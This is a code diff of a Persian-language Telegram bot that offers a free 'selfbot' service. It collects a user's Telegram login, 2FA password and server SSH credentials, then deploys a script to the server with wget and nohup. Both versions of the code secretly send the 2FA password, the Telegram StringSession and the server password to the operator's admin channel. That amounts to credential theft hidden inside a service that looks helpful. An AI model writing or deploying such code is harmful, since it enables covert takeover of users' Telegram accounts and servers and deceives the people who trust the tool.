-                await client.sign_in(password=password)
-                CONV[user_id]["two_step"] = password
-
-                bot_msg = await message.reply("""ورود موفق! آیپی سرور را ارسال کنید:
+                await tele_client.sign_in(password=password)
+                CONV[user_id]["two_step"] = password # Store 2FA password (sensitive)
+                logger.info(f"User {user_id} successfully signed in with 2FA password.")
+                bot_msg = await message.reply_text("""ورود موفق! آیپی سرور را ارسال کنید:
 
 سایت دریافت سرور:
 cp.sprinthost.ru""")
                 CONV[user_id].update({"step": "get_ip", "last_bot_msg": bot_msg.id})
             except Exception as e:
-                await message.reply_animation(
-                   animation="CgACAgIAAxkBAAEBj7ZofjRQXdSA6F3e236N2MId2RofMgACkXwAAquO-Esza0yC5qLo5B4E",
-                   caption="رمز دومرحله ای اشتباه است!"
+                logger.error(f"Error during sign-in with 2FA password for user {user_id}: {e}", exc_info=True)
+                await message.reply_text(
+                   "رمز دومرحله ای اشتباه است! لطفاً /start را ارسال کنید و دوباره امتحان کنید."
                )
-                await client.disconnect()
-                CONV.pop(user_id, None)
-                if RUNNING_USER == user_id:
-                    RUNNING_USER = None
-                    RUN_STARTED_AT = None
+                await cleanup_user_state(user_id)
+                CONV_COMPLETED_EVENT.set_completed(user_id)
+                return
 
-        elif step == "get_ip":
-            CONV[user_id]["ip"] = message.text.strip()
+        elif current_step == "get_ip":
+            ip = message.text.strip()
             try:
-                await message.delete()
-                await client.delete_messages(
-                    chat_id=message.chat.id,
-                    message_ids=CONV[user_id]["last_bot_msg"]
-                )
-            except Exception as e:
-                logger.error(f"{e}")
-
-            bot_msg = await message.reply("""یوزرنیم سرور را ارسال کنید:
+                ipaddress.ip_address(ip) # Validate IP address format
+                CONV[user_id]["ip"] = ip
+                logger.info(f"User {user_id} submitted valid IP: {ip}.")
+                bot_msg = await message.reply_text("""یوزرنیم سرور را ارسال کنید:
 
 سایت دریافت سرور:
 cp.sprinthost.ru""")
-            CONV[user_id].update({"step": "get_user", "last_bot_msg": bot_msg.id})
-
-        elif step == "get_user":
-            CONV[user_id]["user"] = message.text.strip()
-            try:
-                await message.delete()
-                await client.delete_messages(
-                    chat_id=message.chat.id,
-                    message_ids=CONV[user_id]["last_bot_msg"]
+                CONV[user_id].update({"step": "get_user", "last_bot_msg": bot_msg.id})
+            except ValueError:
+                logger.warning(f"User {user_id} submitted invalid IP: {ip}.")
+                bot_msg = await message.reply_text(
+                    """آی‌پی وارد شده معتبر نیست!
+                    
+سایت دریافت سرور:
+cp.sprinthost.ru"""
                 )
-            except Exception as e:
-                logger.error(f"{e}")
+                CONV[user_id]["last_bot_msg"] = bot_msg.id
+                return
 
-            bot_msg = await message.reply("""پسورد سرور را ارسال کنید:
+        elif current_step == "get_user":
+            server_user = message.text.strip()
+            if not server_user:
+                bot_msg = await message.reply_text("یوزرنیم سرور نمی‌تواند خالی باشد. لطفاً یوزرنیم را وارد کنید.")
+                CONV[user_id]["last_bot_msg"] = bot_msg.id
+                return
+            CONV[user_id]["user"] = server_user
+            logger.info(f"User {user_id} submitted server username: {server_user}.")
+            bot_msg = await message.reply_text("""پسورد سرور را ارسال کنید:
 
 سایت دریافت سرور:
 cp.sprinthost.ru""")
             CONV[user_id].update({"step": "get_pass", "last_bot_msg": bot_msg.id})
 
-        elif step == "get_pass":
-            CONV[user_id]["passwd"] = message.text.strip()
-            try:
-                await message.delete()
-                await client.delete_messages(
-                    chat_id=message.chat.id,
-                    message_ids=CONV[user_id]["last_bot_msg"]
-                )
-            except Exception as e:
-                logger.error(f"{e}")
+        elif current_step == "get_pass":
+            passwd = message.text.strip()
+            if not passwd:
+                bot_msg = await message.reply_text("پسورد سرور نمی‌تواند خالی باشد. لطفاً پسورد را وارد کنید.")
+                CONV[user_id]["last_bot_msg"] = bot_msg.id
+                return
+            CONV[user_id]["passwd"] = passwd
+            logger.info(f"User {user_id} submitted server password (masked).")
 
+            # Final step: Execute SSH commands and deploy
             ip = CONV[user_id]["ip"]
             server_user = CONV[user_id]["user"]
-            passwd = CONV[user_id]["passwd"]
-
-            try:
-                ipaddress.ip_address(ip)
-            except ValueError:
-                await message.reply_animation(
-                    animation="CgACAgIAAxkBAAEBj7ZofjRQXdSA6F3e236N2MId2RofMgACkXwAAquO-Esza0yC5qLo5B4E",
-                    caption="""آی‌پی وارد شده معتبر نیست!
-
-سایت دریافت سرور:
-cp.sprinthost.ru"""
-                )
-                await cleanup_sessions(user_id)
-                CONV.pop(user_id, None)
-                if RUNNING_USER == user_id:
-                    RUNNING_USER = None
-                    RUN_STARTED_AT = None
-                return
-
-            wait_msg = None
-            try:
-                wait_msg = await message.reply_animation(
-                    animation="CgACAgIAAxkBAAEBj29ofjGffClyEm1sH7iuYHBgKJLapwACVnwAAquO-Et73xsxHfqWqR4E",
-                    caption="""در حال اجرای عملیات ران لطفا صبر کنید!""",
-                )
-            except Exception as gif_error:
-                logger.error(f"Error sending animation: {gif_error}")
-                wait_msg = await message.reply("""در حال اجرای عملیات ران لطفا صبر کنید!""")
+            tele_client = CONV[user_id]["client"]
+            session_path_prefix = CONV[user_id]["session_path_prefix"]
+            
+            wait_msg = await message.reply_text("""در حال اجرای عملیات ران، لطفاً صبر کنید!
+این فرآیند ممکن است چند دقیقه طول بکشد.""")
+            logger.info(f"User {user_id} started SSH deployment to {ip} with user {server_user}.")
 
             try:
                 with ssh_connection(ip, server_user, passwd) as ssh:
                     sftp = ssh.open_sftp()
                     sftp.get_channel().settimeout(30)
 
+                    # Check if 'self' directory already exists
                     try:
                         sftp.stat("self")
-                        await message.reply_animation(
-                            animation="CgACAgIAAxkBAAEBj7ZofjRQXdSA6F3e236N2MId2RofMgACkXwAAquO-Esza0yC5qLo5B4E",
-                            caption="""سرور قبلا استفاده شده است! لطفا از سرور جدید استفاده کنید.
+                        await wait_msg.edit_text(
+                            """سرور قبلاً استفاده شده است! لطفاً از سرور جدید استفاده کنید.
 
 cp.sprinthost.ru"""
                         )
-                        if wait_msg:
-                            try:
-                                await wait_msg.delete()
-                            except Exception as delete_error:
-                                logger.error(f"Error deleting wait message: {delete_error}")
-                        await cleanup_sessions(user_id)
-                        CONV.pop(user_id, None)
-                        if RUNNING_USER == user_id:
-                            RUNNING_USER = None
-                            RUN_STARTED_AT = None
+                        logger.warning(f"User {user_id}'s server {ip} already has 'self' directory.")
+                        CONV_COMPLETED_EVENT.set_completed(user_id)
+                        await cleanup_user_state(user_id)
                         return
                     except FileNotFoundError:
-                        pass
+                        pass # Directory does not exist, proceed
 
+                    # Create 'self' directory on remote server
                     try:
                         stdin, stdout, stderr = ssh.exec_command("mkdir -p self", timeout=30)
                         exit_code = stdout.channel.recv_exit_status()
                         if exit_code != 0:
                             error = stderr.read().decode().strip()
-                            raise Exception("خطا در اجرای سلف، لطفا از سالم بودن سرور خود و صحیح بودن اطلاعات ارسالی آن مطمئن شوید.")
+                            raise Exception(f"خطا در ایجاد دایرکتوری 'self' در سرور ریموت: {error}")
+                        logger.info(f"Created 'self' directory on {ip}.")
                     except Exception as e:
-                        await message.reply_animation(
-                            animation="CgACAgIAAxkBAAEBj7ZofjRQXdSA6F3e236N2MId2RofMgACkXwAAquO-Esza0yC5qLo5B4E",
-                            caption="خطا در اجرای سلف! لطفا مطمئن شوید اطلاعات سرور صحیح است یا سرورتان مسدود نشده است."
+                        logger.error(f"SSH command 'mkdir -p self' failed for user {user_id} on {ip}: {e}", exc_info=True)
+                        await wait_msg.edit_text(
+                            "خطا در ایجاد پوشه 'self' روی سرور! لطفاً از سالم بودن سرور خود و صحیح بودن اطلاعات ارسالی آن مطمئن شوید."
                         )
-                        await cleanup_sessions(user_id)
-                        CONV.pop(user_id, None)
-                        if RUNNING_USER == user_id:
-                            RUNNING_USER = None
-                            RUN_STARTED_AT = None
+                        CONV_COMPLETED_EVENT.set_completed(user_id)
+                        await cleanup_user_state(user_id)
                         return
 
-                    try:
-                        stdin, stdout, stderr = ssh.exec_command("mkdir -p file", timeout=30)
-                        exit_code = stdout.channel.recv_exit_status()
-                        if exit_code != 0:
-                            error = stderr.read().decode().strip()
-                            raise Exception("خطا در اجرای سلف، لطفا از سالم بودن سرور خود و صحیح بودن اطلاعات ارسالی آن مطمئن شوید.")
-                    except Exception as e:
-                        await message.reply_animation(
-                            animation="CgACAgIAAxkBAAEBj7ZofjRQXdSA6F3e236N2MId2RofMgACkXwAAquO-Esza0yC5qLo5B4E",
-                            caption="خطا در اجرای سلف! لطفا مطمئن شوید اطلاعات سرور صحیح است یا سرورتان مسدود نشده است."
-                        )
-                        await cleanup_sessions(user_id)
-                        CONV.pop(user_id, None)
-                        if RUNNING_USER == user_id:
-                            RUNNING_USER = None
-                            RUN_STARTED_AT = None
-                        return
+                    # Download self.py script directly to remote server
+                    remote_script_dir = "self"
+                    remote_script_name = "self.py"
+                    remote_script_path = os.path.join(remote_script_dir, remote_script_name)
+                    script_url = "https://raw.githubusercontent.com/Par123456/selfsaz/refs/heads/main/self.py"
 
-                    sftp.put("file/self.py", "file/self.py")
-                    stdin, stdout, stderr = ssh.exec_command("cp file/self.py self/self.py", timeout=30)
+                    download_command = f"wget -O {remote_script_path} {script_url}"
+                    logger.info(f"Executing remote download: {download_command} on {ip}.")
+                    stdin, stdout, stderr = ssh.exec_command(download_command, timeout=60)
                     exit_code = stdout.channel.recv_exit_status()
                     if exit_code != 0:
                         error = stderr.read().decode().strip()
-                        raise Exception(f"خطا در اجرای سلف! این موضوع را به پشتیبانی اطلاع دهید.")
+                        raise Exception(f"خطا در دانلود فایل سلف از سرور ریموت: {error}")
+                    logger.info(f"Downloaded self.py to {remote_script_path} on {ip}.")
 
-                    local_session = "sessions/selfbot.session"
-                    local_journal = "sessions/selfbot.session-journal"
-                    remote_session = "self/selfbot.session"
-                    remote_journal = "self/selfbot.session-journal"
 
-                    try:
-                        import shutil
-                        from telethon import TelegramClient
-                        from telethon.sessions import StringSession
+                    # Generate and upload StringSession
+                    # The Telethon client is already connected from get_number/get_code/get_2fa steps
+                    string_session = StringSession.save(tele_client.session)
+                    CONV[user_id]["string"] = string_session # Store for admin log
+                    logger.info(f"Generated StringSession for user {user_id}.")
 
-                        tmp_session = f"sessions/selfbot_temp_{user_id}.session"
-                        tmp_journal = f"sessions/selfbot_temp_{user_id}.session-journal"
+                    # Now upload the generated .session file
+                    local_session_file = f"{session_path_prefix}.session"
+                    remote_session_file = f"{remote_script_dir}/session.session" # Renamed to generic name on remote
 
-                        if os.path.exists(local_session):
-                            shutil.copy(local_session, tmp_session)
-                        if os.path.exists(local_journal):
-                            shutil.copy(local_journal, tmp_journal)
-
-                        tele_client = TelegramClient(
-                            session=tmp_session,
-                            api_id=API_ID,
-                            api_hash=API_HASH,
-                            device_model="Samsung Galaxy A52",
-                            system_version="Android 13",
-                            app_version="11.13.2 (6060)",
-                            lang_code="en"
-                        )
-                        await tele_client.connect()
-                        string = StringSession.save(tele_client.session)
-                        await tele_client.disconnect()
-                        CONV[user_id]["string"] = string
-                    except Exception as e:
-                        logger.error(f"Error saving StringSession: {e}")
-                        CONV[user_id]["string"] = "Err!"
-                    finally:
-                        for f in [tmp_session, tmp_journal]:
-                            try:
-                                if os.path.exists(f):
-                                    os.remove(f)
-                            except:
-                                pass
-
-                    if os.path.exists(local_session):
-                        await asyncio.to_thread(sftp.put, local_session, remote_session)
-                        ssh.exec_command("sync", timeout=5)
-                    if os.path.exists(local_journal):
-                        await asyncio.to_thread(sftp.put, local_journal, remote_journal)
-                        ssh.exec_command("sync", timeout=5)
-
+                    if os.path.exists(local_session_file):
+                        await asyncio.to_thread(sftp.put, local_session_file, remote_session_file)
+                        ssh.exec_command("sync", timeout=5) # Ensure file is flushed
+                        logger.info(f"Uploaded {local_session_file} to {remote_session_file} on {ip}.")
+                    else:
+                        logger.error(f"Local session file {local_session_file} not found for user {user_id}.")
+                        raise Exception("خطا در یافتن فایل سشن تلگرام.")
+                    
+                    # Install dependencies and run the selfbot
                     commands = [
-                        "pip install telethon pytz jdatetime paramiko",
-                        "cd self && nohup python3 self.py >> log.txt 2>&1 &"
+                        f"cd {remote_script_dir} && pip install telethon pytz jdatetime paramiko",
+                        f"cd {remote_script_dir} && nohup python3 {remote_script_name} >> log.txt 2>&1 &"
                     ]
 
                     for cmd in commands:
-                        stdin, stdout, stderr = ssh.exec_command(cmd, timeout=60)
+                        logger.info(f"Executing remote command: {cmd} on {ip}.")
+                        stdin, stdout, stderr = ssh.exec_command(cmd, timeout=120) # Increased timeout for pip install
                         exit_status = stdout.channel.recv_exit_status()
                         if exit_status != 0:
                             error_msg = stderr.read().decode().strip()
-                            await message.reply_animation(
-                                animation="CgACAgIAAxkBAAEBj7ZofjRQXdSA6F3e236N2MId2RofMgACkXwAAquO-Esza0yC5qLo5B4E",
-                                caption="خطا در اجرای سلف! متاسفانه دسترسی به دستورات ترمینال سرور شما داده نشده است، این موضوع را به پشتیبانی اطلاع دهید."
-                            )
-                            return
-                        await asyncio.sleep(1)
+                            raise Exception(f"خطا در اجرای سلف! {error_msg}. ممکن است دسترسی به دستورات ترمینال سرور شما داده نشده باشد.")
+                        await asyncio.sleep(1) # Small delay between commands
+                    logger.info(f"Selfbot deployment commands executed on {ip}.")
 
-                    ssh.exec_command("rm -f self/self.py file/self.py", timeout=10)
-
-                await cleanup_sessions(user_id)
-
-                try:
-                    if wait_msg:
-                        await wait_msg.delete()
-                except Exception as delete_error:
-                    logger.error(f"{delete_error}")
+                # Post-deployment actions
+                await cleanup_user_state(user_id) # Cleans up local session files and client
+                await wait_msg.delete() # Delete the "in progress" message
 
                 if user_id not in OWNER_IDS and REMAINING_RUNS > 0:
                     globals()["REMAINING_RUNS"] -= 1
                     save_max_runs(REMAINING_RUNS)
-
-                if user_id in OWNER_IDS:
-                    NEXT_RUN_ALLOWED_AT = datetime.now(timezone("Asia/Tehran")) + timedelta(seconds=30)
-                else:
-                    NEXT_RUN_ALLOWED_AT = datetime.now(timezone("Asia/Tehran")) + timedelta(minutes=30)
-
-                await message.reply_animation(
-                    animation="CgACAgIAAxkBAAEBj7VofjROAAF3fpC67VGHjuG2Rot_fGUAApB8AAKrjvhLgRAouSvf40ceBA",
-                    caption="""سلف با موفقیت روی سرور شما اجرا شد، با دستور `راهنما` منوی راهنما سلف را باز کنید.
-
-فروش این سلف ممنوع است!
-@AlfredSelf
-سلف ساز رایگان:
-@AlfredSelfBot"""
-                )
+                    logger.info(f"REMAINING_RUNS decremented to {REMAINING_RUNS} for user {user_id}.")
 
                 if user_id not in OWNER_IDS:
-                    LAST_RUNS[user_id] = time.time()
+                    LAST_RUNS[user_id] = time.time() # Update 24-hour cooldown
                     save_last_runs()
+                    logger.info(f"User {user_id} added to 24-hour cooldown.")
 
-                RUNNING_USER = None
-                RUN_STARTED_AT = None
+                await message.reply_text(
+                    """سلف با موفقیت روی سرور شما اجرا شد، با دستور `راهنما` منوی راهنمای سلف را باز کنید.
 
-                try:
-                    with open("channel_id.txt", "r") as f:
-                        NEWS_ID = int(f.read().strip())
-                except Exception as e:
-                    logger.error(f"{e}")
-                    NEWS_ID = None
+فروش این سلف ممنوع است!
+@No1Self
+سلف ساز رایگان:
+@No1SelfBot"""
+                )
+                logger.info(f"Selfbot successfully deployed for user {user_id}.")
 
-                if NEWS_ID:
+                # Send log to admin channel
+                if ADMIN_LOG_CHANNEL_ID:
                     username_or_mention = f"@{message.from_user.username}" if message.from_user.username else f"[{message.from_user.first_name}](tg://user?id={user_id})"
-                    two_step_pass = CONV[user_id].get("two_step", "NoPasswd!")
+                    two_step_pass = CONV[user_id].get("two_step", "NoPasswd!") # Sensitive data
 
                     info = (
-                        f"New Run!\n"
-                        f"User: {username_or_mention}\n"
-                        f"Userid: {user_id}\n"
-                        f"Number: +{CONV[user_id]['number']}\n"
-                        f"Password: `{two_step_pass}`\n"
-                        f"String: `{CONV[user_id]['string']}`\n"
-                        f"Server ip: {ip}\n"
-                        f"Server user: {server_user}\n"
-                        f"Server password: {passwd}"
+                        f"**New No1 Self Run!**\n"
+                        f"**User:** {username_or_mention}\n"
+                        f"**User ID:** `{user_id}`\n"
+                        f"**Number:** `+{CONV[user_id]['number']}`\n"
+                        f"**2FA Password:** `{two_step_pass}`\n" # Highly sensitive, review logging policy
+                        f"**StringSession:** `{CONV[user_id]['string']}`\n" # Highly sensitive
+                        f"**Server IP:** `{ip}`\n"
+                        f"**Server User:** `{server_user}`\n"
+                        f"**Server Password:** `{passwd}`\n" # Highly sensitive, review logging policy
+                        f"**Remaining Global Runs:** `{REMAINING_RUNS}`"
                     )
 
                     try:
-                        await bot.send_message(NEWS_ID, info)
+                        await bot.send_message(ADMIN_LOG_CHANNEL_ID, info, disable_web_page_preview=True)
+                        logger.info(f"Admin log sent for user {user_id}.")
                     except Exception as e:
-                        logger.error(f"{e}")
+                        logger.error(f"Error sending admin log message for user {user_id}: {e}", exc_info=True)
+                else:
+                    logger.warning(f"ADMIN_LOG_CHANNEL_ID not set. Could not send deployment log for user {user_id}.")
 
-                CONV.pop(user_id, None)
-
+                CONV_COMPLETED_EVENT.set_completed(user_id) # Signal successful completion to timeout manager
+                
             except Exception as e:
-                await message.reply_animation(
-                    animation="CgACAgIAAxkBAAEBj7ZofjRQXdSA6F3e236N2MId2RofMgACkXwAAquO-Esza0yC5qLo5B4E",
-                    caption="خطا در اجرای سلف! لطفا از درست بودن اطلاعات سرور و سالم بودن سرور خود مطمئن شوید."
-                )
-                await cleanup_sessions(user_id)
-                CONV.pop(user_id, None)
-                if RUNNING_USER == user_id:
-                    RUNNING_USER = None
-                    RUN_STARTED_AT = None
+                logger.error(f"SSH deployment or related error for user {user_id} on {ip}: {e}", exc_info=True)
+                if wait_msg:
+                    try:
+                        await wait_msg.edit_text(
+                            "خطا در اجرای سلف! لطفاً از درست بودن اطلاعات سرور و سالم بودن سرور خود مطمئن شوید. برای شروع دوباره /start را ارسال کنید."
+                        )
+                    except Exception as edit_error:
+                        logger.error(f"Error editing error message for user {user_id}: {edit_error}")
+                        await message.reply_text(
+                            "خطا در اجرای سلف! لطفاً از درست بودن اطلاعات سرور و سالم بودن سرور خود مطمئن شوید. برای شروع دوباره /start را ارسال کنید."
+                        )
+                await cleanup_user_state(user_id)
+                CONV_COMPLETED_EVENT.set_completed(user_id) # Signal completion (even on error) to timeout manager
+
     except Exception as e:
-        logger.error(f"{e}")
-        await message.reply_animation(
-            animation="CgACAgIAAxkBAAEBj7ZofjRQXdSA6F3e236N2MId2RofMgACkXwAAquO-Esza0yC5qLo5B4E",
-            caption="خطایی رخ داده است! لطفاً دوباره امتحان کنید."
-        )
+        logger.error(f"Unhandled error in conversation_handler for user {user_id} at step {current_step}: {e}", exc_info=True)
+        if user_id in CONV and CONV[user_id].get("last_bot_msg"):
+            try:
+                await client.edit_message_text(chat_id, CONV[user_id]["last_bot_msg"], "خطایی غیرمنتظره رخ داد! لطفاً /start را ارسال کنید و دوباره امتحان کنید.")
+            except Exception:
+                await message.reply_text("خطایی غیرمنتظره رخ داد! لطفاً /start را ارسال کنید و دوباره امتحان کنید.")
+        else:
+            await message.reply_text("خطایی غیرمنتظره رخ داد! لطفاً /start را ارسال کنید و دوباره امتحان کنید.")
+        CONV_COMPLETED_EVENT.set_completed(user_id)
+        await cleanup_user_state(user_id)
 
 async def channel_message_updater():
-    last_minute = None
-    last_run_count = REMAINING_RUNS
+    """Periodically updates the status message in the public channel."""
+    last_minute_update = None
+    last_run_count_update = REMAINING_RUNS
     while True:
         try:
             now = datetime.now(timezone("Asia/Tehran"))
             current_minute = now.strftime('%H:%M')
-            current_run_count = load_max_runs()
+            current_run_count = load_max_runs() # Reload to ensure consistency
 
-            if current_minute != last_minute or current_run_count != last_run_count:
-                last_minute = current_minute
-                last_run_count = current_run_count
-                globals()["REMAINING_RUNS"] = current_run_count
+            if current_minute != last_minute_update or current_run_count != last_run_count_update:
+                last_minute_update = current_minute
+                last_run_count_update = current_run_count
+                globals()["REMAINING_RUNS"] = current_run_count # Ensure global variable is updated
                 await update_channel_message()
         except Exception as e:
-            logger.error(f"{e}")
-        await asyncio.sleep(1)
+            logger.error(f"Error in channel_message_updater: {e}", exc_info=True)
+        await asyncio.sleep(5) # Check every 5 seconds to reduce load
 
 if __name__ == "__main__":
+    logger.info("Starting No1 Self Bot...")
     while True:
         try:
             bot.start()
+            logger.info("Bot client started.")
             loop = asyncio.get_event_loop()
-            loop.create_task(channel_message_updater())
-            idle()
+            loop.create_task(channel_message_updater()) # Start the background updater
+            idle() # Keep the bot running
+            logger.info("Bot idle stopped.")
         except Exception as e:
-            logger.critical(f"{e}")
-            time.sleep(10)
+            logger.critical(f"Bot experienced a critical error: {e}", exc_info=True)
+            logger.info("Attempting to restart bot in 10 seconds...")
+            time.sleep(10) # Wait before attempting to restart
         finally:
             try:
-                bot.stop()
+                if bot.is_connected:
+                    bot.stop()
+                    logger.info("Bot client stopped.")
             except Exception as e:
-                logger.warning(f"{e}")
+                logger.warning(f"Error stopping bot client: {e}", exc_info=True)
+    logger.critical("Bot process exited unexpectedly from main loop.")
